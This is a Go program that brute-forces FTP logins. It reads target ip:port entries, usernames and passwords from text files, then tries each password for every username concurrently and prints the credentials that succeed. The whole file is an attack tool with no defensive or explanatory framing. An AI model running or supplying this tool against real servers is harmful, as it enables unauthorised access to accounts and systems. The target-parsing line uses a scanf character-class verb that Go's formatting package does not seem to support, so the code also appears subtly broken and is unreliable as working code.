package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"sync"

	"github.com/jlaffaye/ftp"
)

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines, scanner.Err()
}

func testLogin(ip string, port int, username string, passwords []string, wg *sync.WaitGroup) {
	defer wg.Done()
	conn, err := ftp.Dial(fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		log.Printf("Failed to connect to %s:%d - %v", ip, port, err)
		return
	}
	defer conn.Logout()

	for _, password := range passwords {
		fmt.Printf("Attempting to connect to %s:%d with username: %s password: %s\n", ip, port, username, password)
		err := conn.Login(username, password)
		if err == nil {
			fmt.Printf("Login successful for %s on %s:%d\n", username, ip, port)
			return
		}
	}
}

func main() {
	servers, err := readLines("ipport.txt")
	if err != nil {
		log.Fatal(err)
	}

	usernames, err := readLines("usernames.txt")
	if err != nil {
		log.Fatal(err)
	}

	passwords, err := readLines("passwords.txt")
	if err != nil {
		log.Fatal(err)
	}

	var wg sync.WaitGroup
	for _, server := range servers {
		var ip string
		var port int
		_, err := fmt.Sscanf(server, "%[^:]:%d", &ip, &port)
		if err != nil || port <= 0 {
			log.Printf("Invalid server entry: %s", server)
			continue
		}

		for _, username := range usernames {
			wg.Add(1)
			go testLogin(ip, port, username, passwords, &wg)
		}
	}

	wg.Wait()
	fmt.Println("All attempts completed.")
}
